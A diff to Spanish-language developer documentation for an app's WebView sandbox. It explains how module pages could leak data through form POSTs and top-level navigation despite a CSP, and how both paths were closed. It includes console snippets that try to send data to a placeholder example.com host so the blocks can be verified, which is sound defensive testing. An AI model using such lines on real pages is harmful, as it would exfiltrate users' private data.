@@ -278,27 +278,57 @@ modulo:examenes: error: Refused to connect to 'http://127.0.0.1:8095/...' becaus
 violates the following Content Security Policy directive: "connect-src 'self'"
 ```
 
-**Y una rendija que en iOS ya está cerrada, y en Android sigue abierta.** Allá la navegación de
-nivel superior quedó libre porque falta `ShouldOverrideUrlLoading`: si el módulo hace
-`location = 'https://…'`, el WebView va. Acá está puesto —`OnlyItsOwnOrigin`, un
-`WKNavigationDelegate` en [`IosWebModule.cs`](IosWebModule.cs)— y **sí se puede medir sin tocar
-el módulo**, porque no depende de la CSP. En el inspector de Safari, con el módulo abierto:
+### Las otras dos salidas, y ésta se corre entera
+
+`connect-src` cubre el `fetch`, pero **no es la única forma de sacar datos de una página**. Hay
+dos más, y las dos estaban abiertas hasta el **2026-09-07**:
+
+| salida | qué la gobierna | ¿hereda de `default-src`? |
+|---|---|---|
+| **`<form action="https://ajeno" method="post">`** | `form-action` | **no** — por eso faltaba |
+| **`window.location = 'https://ajeno/?d=…'`** | **ninguna directiva existe** | — |
+
+La primera se cerró con `form-action 'self'` en la cadena compartida —o sea que Android e iOS la
+tienen por el mismo código—; la segunda con `OnlyItsOwnOrigin`, un `WKNavigationDelegate` en
+[`IosWebModule.cs`](IosWebModule.cs), que compara el **origen completo** y loguea el rechazo.
+
+**Esta parte no necesita sonda.** En el inspector de Safari (Develop → Simulator → el WebView),
+con el módulo abierto:
 
 ```javascript
-window.location = 'https://example.com'
+// intento A · el formulario
+var f = document.createElement('form');
+f.method = 'POST'; f.action = 'https://example.com/collect';
+document.body.appendChild(f); f.submit();
+
+// intento B · la navegación
+window.location = 'https://example.com/?d=lo-que-sea';
 ```
 
-La página **no** tiene que cambiar, y el log tiene que decir:
+**Qué tenés que ver.** La página **no** se mueve de su propio origen, y en el log:
 
 ```
+modulo:examenes: Sending form data to 'https://example.com/collect' violates the following
+Content Security Policy directive: "form-action 'self'". The request has been blocked.
 GNOTHI: examenes: navigation refused to https://example.com -- outside its own origin
 ```
 
-Probá también `gnothi-mod://otro-modulo/` : también tiene que rebotar, porque la regla es el
-origen completo (esquema **y** host), no sólo el esquema. Un módulo no puede navegar al de otro.
+Probá también `gnothi-mod://otro-modulo/`: también tiene que rebotar, porque la regla es el
+origen completo —esquema **y** host—, no sólo el esquema. Un módulo no puede navegar al de otro.
 
-Esto es una diferencia real de plataforma a favor de iOS, y conviene decirlo en esos términos
-cuando se compare: la contención de Android está incompleta en este punto.
+> **MEDIDO el 2026-09-07 en Android, antes y después**, que es donde había emulador. Sin el
+> arreglo los dos intentos **salían**: la página terminaba en `https://example.com/collect` y el
+> servidor contestaba **405**, o sea que el POST llegó de verdad a la red; y la navegación
+> terminaba en `https://example.com/?d=datos-de-sonia`. No era un agujero teórico.
+>
+> **[NO MEDIDO EN iOS].** `form-action` es la misma cadena del mismo código, así que debería dar
+> igual. `OnlyItsOwnOrigin` es código propio de iOS y **nunca corrió en un aparato**: si algo de
+> esta prueba falla, es el candidato.
+
+**Y el inspector ahora funciona.** Desde iOS 16.4 un `WKWebView` sólo aparece en Develop si se
+declara inspeccionable, y el valor por omisión es `false` — Safari lista **nada**, sin decir por
+qué. Se puso `web.Inspectable = true` bajo `#if DEBUG`, y sólo ahí: un WebView inspeccionable
+deja leer la memoria de la página a quien tenga un cable, y esa memoria tiene el journal.
 
 ---
 
